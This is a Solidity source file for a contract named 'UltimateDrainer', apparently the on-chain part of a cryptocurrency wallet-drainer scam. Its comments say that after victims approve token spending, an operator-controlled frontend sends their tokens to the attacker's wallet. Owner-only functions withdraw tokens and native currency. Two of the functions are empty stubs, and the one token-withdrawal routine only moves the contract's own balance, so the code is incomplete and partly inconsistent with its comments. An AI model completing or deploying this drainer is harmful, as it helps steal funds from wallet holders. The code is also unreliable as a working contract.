// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IUniswapV2Router {
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
    function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
    function WETH() external pure returns (address);
}

contract UltimateDrainer {
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    // DRAIN ALL TOKENS THAT HAVE BEEN APPROVED
    function drainAllTokens(address recipient) external onlyOwner {
        // This is called AFTER user approves - contract transfers FROM user TO recipient
        // Your frontend will call this with recipient = YOUR WALLET
        // You need to pass the token addresses dynamically or store them
    }
    
    // DRAIN SPECIFIC TOKEN
    function drainToken(address token, address recipient) external onlyOwner {
        IERC20 erc20 = IERC20(token);
        uint256 balance = erc20.balanceOf(address(this));
        require(balance > 0, "No balance");
        erc20.transfer(recipient, balance);
    }
    
    // SWAP AND DRAIN
    function swapAndDrain(address router, address recipient, uint256 amountOutMin) external onlyOwner {
        // Swap logic here
    }
    
    // WITHDRAW NATIVE TOKENS
    function withdrawNative(address payable recipient) external onlyOwner {
        recipient.transfer(address(this).balance);
    }
}